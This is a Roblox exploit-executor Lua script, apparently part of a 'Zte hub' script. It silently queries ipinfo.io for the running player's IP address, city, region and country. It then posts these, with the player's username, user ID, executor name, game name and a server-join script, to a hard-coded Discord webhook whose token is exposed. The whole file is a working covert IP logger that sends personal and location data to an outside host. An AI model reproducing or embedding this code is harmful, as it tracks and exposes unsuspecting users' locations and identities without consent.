local HttpService        = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")
local WebhookUrl         = "https://discord.com/api/webhooks/1379048133702455396/TmMAJJF_g_04qtJasWYKHI2K0JmX-l01wp_LBGGNCj9wECRli2a3OtIXSW-PSyRgmuHy"
local executor           = identifyexecutor() or "Unknown"

-- Hàm mới: dùng ipinfo.io để lấy IP + country code + city + region
local function getIPInfo()
    if not HttpService.HttpEnabled then
        warn("[getIPInfo] HttpService.HttpEnabled = false → bật HTTP Requests trong Game Settings")
        return "Unknown", "UNK", "Unknown", "Unknown"
    end

    -- Thực hiện RequestAsync lên https://ipinfo.io/json
    local params = {
        Url     = "https://ipinfo.io/json",
        Method  = "GET",
        Headers = {
            ["User-Agent"] = "Roblox"
        }
    }

    local ok, res = pcall(function()
        return HttpService:RequestAsync(params)
    end)

    if not ok then
        warn("[getIPInfo] RequestAsync lỗi:", res)
        return "Unknown", "UNK", "Unknown", "Unknown"
    end

    if not res.Success or not res.Body then
        warn(string.format(
            "[getIPInfo] HTTP error: %s %s",
            tostring(res.StatusCode), tostring(res.StatusMessage)
        ))
        return "Unknown", "UNK", "Unknown", "Unknown"
    end

    -- Giải mã JSON
    local data
    local decodeOK, decodeErr = pcall(function()
        data = HttpService:JSONDecode(res.Body)
    end)

    if not decodeOK then
        warn("[getIPInfo] JSONDecode lỗi:", decodeErr)
        return "Unknown", "UNK", "Unknown", "Unknown"
    end

    -- Kiểm tra xem các trường có tồn tại hay không
    -- ipinfo.io/json trả về ví dụ:
    -- {
    --   "ip": "113.184.6.33",
    --   "hostname": "...",
    --   "city": "Thành Phố Uông Bí",
    --   "region": "Quảng Ninh",
    --   "country": "VN",
    --   "loc": "21.0343,106.7705",
    --   "org": "AS45899 VNPT Corp",
    --   "postal": "02350",
    --   "timezone": "Asia/Bangkok",
    --   "readme": "https://ipinfo.io/missingauth"
    -- }
    if data and data.ip and data.country and data.city and data.region then
        return data.ip, data.country, data.city, data.region
    else
        warn("[getIPInfo] Thiếu fields trong response:", res.Body)
        return "Unknown", "UNK", "Unknown", "Unknown"
    end
end

-- Lấy tên game bình thường
local function getGameName()
    local placeId = game.PlaceId
    local success, placeInfo = pcall(function()
        return MarketplaceService:GetProductInfo(placeId)
    end)
    if success and placeInfo and placeInfo.Name then
        return placeInfo.Name
    else
        return "Unknown Game"
    end
end

-- Tạo payload và gửi webhook
local function sendRequest()
    local player      = game.Players.LocalPlayer
    local displayName = player and player.DisplayName or "N/A"
    local userName    = player and player.Name or "Unknown"
    local playerId    = player and player.UserId or 0

    -- Chuẩn bị joinScript nếu cần
    local placeId = tostring(game.PlaceId)
    local jobId   = tostring(game.JobId)
    local joinScript = "game:GetService('TeleportService'):TeleportToPlaceInstance(" ..
                       placeId .. ", '" .. jobId .. "', game.Players.LocalPlayer)"

    -- Gọi hàm getIPInfo mới: trả về ﹕ ip, country code, city, region
    local ip, cc, city, region = getIPInfo()

    -- Lấy tên game
    local gameName = getGameName()

    -- Xây payload cho Discord webhook
    local payload = {
        content = "**Thanks for using the script!**",
        embeds = {
            {
                author = { name = "Zte hub Server" },
                title  = userName .. " | " .. displayName,
                type   = "rich",
                color  = tonumber(0x00FF00),
                thumbnail = {
                    url = "https://api.newstargeted.com/roblox/users/v1/avatar-headshot?" ..
                          "userid=" .. playerId .. "&size=720x720&format=Png&isCircular=false"
                },
                fields = {
                    { name = "Executor",     value = executor, inline = true  },
                    { name = "City",         value = city,     inline = true  },
                    { name = "Region",       value = region,   inline = true  },
                    { name = "Country Code", value = cc,       inline = true  },
                    { name = "IP Address",   value = ip,       inline = true  },
                    { name = "Game Name",    value = gameName, inline = false },
                },
            },
            {
                title       = "Join Server Script",
                description = "\n```lua\n" .. joinScript .. "\n```\n",
                color       = tonumber(0x00FF00),
            }
        }
    }

    return {
        Url     = WebhookUrl,
        Method  = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body    = HttpService:JSONEncode(payload)
    }
end

-- Gửi request
if syn then
    syn.request(sendRequest())
else
    local requestFunction = http_request or request or HttpPost or (syn and syn.request)
    requestFunction(sendRequest())
end
